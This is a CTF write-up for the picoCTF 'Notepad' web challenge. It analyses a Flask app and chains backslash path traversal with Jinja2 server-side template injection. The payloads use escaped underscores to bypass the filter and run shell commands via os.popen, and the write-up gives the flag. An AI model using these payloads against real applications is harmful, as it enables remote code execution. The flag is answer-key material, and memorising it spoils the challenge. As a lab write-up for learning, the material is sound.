---
title: "Notepad - Web exploitation"
description: Path traversal, bypass filter, SSTI injection, Jinja2 injection
tags: CTF,Web, PICOCTF
robots: index,follow
lang: en
breaks: true
---

# Notepad Writeup

[TOC]

## How it works

- First i will download the tar file and extract it to analyse the website's source code. There is an important python file which show how the website work and it logic flow.
```python=
from werkzeug.urls import url_fix
from secrets import token_urlsafe
from flask import Flask, request, render_template, redirect, url_for

app = Flask(__name__)

@app.route("/")
def index():
    return render_template("index.html", error=request.args.get("error"))

@app.route("/new", methods=["POST"])
def create():
    content = request.form.get("content", "")
    if "_" in content or "/" in content:
        return redirect(url_for("index", error="bad_content"))
    if len(content) > 512:
        return redirect(url_for("index", error="long_content", len=len(content)))
    name = f"static/{url_fix(content[:128])}-{token_urlsafe(8)}.html"
    with open(name, "w") as f:
        f.write(content)
    return redirect(name)
```

Now i can try to get access to the website page and it seem to be a note writting page where you can create your own note with your content in it. 
- Then I try to writting something normal like `hello`
- When i submit query, the app first inspect note's content for checking any blacklist characters like `_` or `/` (first condition). 
    - If the note contain blacklist word, the app set the `error` value to `bad_content`
- After that, the app then count the length of note's content i created
    - If the length > 512, the app set the `error` value to `long_content`.
    
From this one, i realize the index page of the web (`app.route("/")`) render template `index.html` and always get the request arguments of the `error` value

```python=
@app.route("/")
def index():
    return render_template("index.html", error=request.args.get("error"))
```

After i created a valid note, the app set the filename with first `128` characters in the note's content that i have created
- Then add the filename content from secret import token_urlsafe:  `-{token_urlsafe(8)}.html`
==> That `html` file is created by the app and `write` all the content to that file
    - The file then redirected to the `/static` directory in the web's source code and we can see the note we create with full URL: `https://notepad.mars.cylabacademy.net/static/hello-XXXXXXXX.html`

:::info
Now we know how the note created and how it rendered, writting into the file from the source code. The logic web app checking for any blacklist character.
:::
I also visualize the web app structure endpoints:
```text=
NotePad 
app/ (main directory)
|
|
├── app.py --> App logic flow
|
├──Docerfile --> Web app configuration
|
├──static/
|     |
|     ├── hello-XXXXXXXX.html (the file that user created)
|     ... (many more)
├──templates/
|     |
|     ├── index.html (web main page)
|     |
|     ├──errors/
|           |
|           ├──bad_content.html
|           ├──long_content.html
```

### The problem

I was confused why this app block the suspicious `/` for what. May be it block any `path traversal` technique.
- However, this app using the `url_fix` for standardize the filename created. 
- After researching, I found that the `\` can be converted into `/` by using `url_fix` but this app did not block the `\` so i can use this to do some `path traversal` technique

Now let's have a look at the index.html, the `error` logic part is quite suspicious
```html=
<!doctype html>
{% if error is not none %}
  <h3>
    error: {{ error }}
  </h3>
  {% include "errors/" + error + ".html" ignore missing %}
{% endif %}
<h2>make a new note</h2>
<form action="/new" method="POST">
  <textarea name="content"></textarea>
  <input type="submit">
</form>
```
and this Flask python template `render_template` function with `request.args.get`

```python=
from flask import Flask, request, render_template, redirect, url_for

app = Flask(__name__)

@app.route("/")
def index():
    return render_template("index.html", error=request.args.get("error"))
```

==> This is particular `SSTI injection` using Flask python template for render the file and get the request arguments with `error` parameter

But the `error` parameter only executed if we include the `/errors` endpoint with the real `error` file in it. It must be exactly match the correct `error` file that we want to search for

- My first thought is that i can inject the `error` parameter request with query: `{{7*7}}` but when i look back the `index.html`. 
    - It say that if there is no error file that we search for, the app will only return the raw `error` text: 
```html=
<h3>
    error: {{ error }}
</h3>
```
Mean that the app cannot `render` or `compile` the query 


### Solution
My idea:
:::success
Created a note with backslash for bypassing filter --> redirect to the errors directory for compile SSTI injection --> Using query for testing which template are using
:::

First let create our new note.
- We all knew that all the files we created are redirected to `/static` endpoint so now let's divert into `errors` dir base on the app structure
- Because the filename only takes `128` chars for creating filename (using `url_fix`) , mean that it cannot compile or render the template created
- So we must pass through all 128 chars and start to add query after that for file compiling and render file template

Then i use the testing query cheking which template is it : `{{7*7}}`

Full payload: `..\templates\errors\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa{{7*7}}`

![image](https://hackmd.io/_uploads/BJWYBu1oGl.png)

Then now do the search the error file through `error` parameter

```html=
<!doctype html>

  <h3>
    error: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-wx8pJthWS-M
  </h3>
  ..\templates\errors\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa49

<h2>make a new note</h2>
<form action="/new" method="POST">
  <textarea name="content"></textarea>
  <input type="submit">
</form>
```
We can see the number 49 --> SSTI injection executed 
--> It is the Jinja2 template injection


Now let combine the payload and the SSTI payload that can bypass filter block `/` or `_`

Full payload:`..\templates\errors\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('ls')['read']()}}`

![image](https://hackmd.io/_uploads/SyCiUd1ofx.png)


Now read the flag and end this challenge:

Final payload:`..\templates\errors\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('cat flag-c8f5526c-4122-4578-96de-d7dd27193798.txt')['read']()}}`
![image](https://hackmd.io/_uploads/rkyEPd1izl.png)


**FLAG**: `picoCTF{styl1ng_susp1c10usly_s1m1l4r_t0_p4steb1n}`
**author**: @Kkhao
**Solved**: 04/10/2026



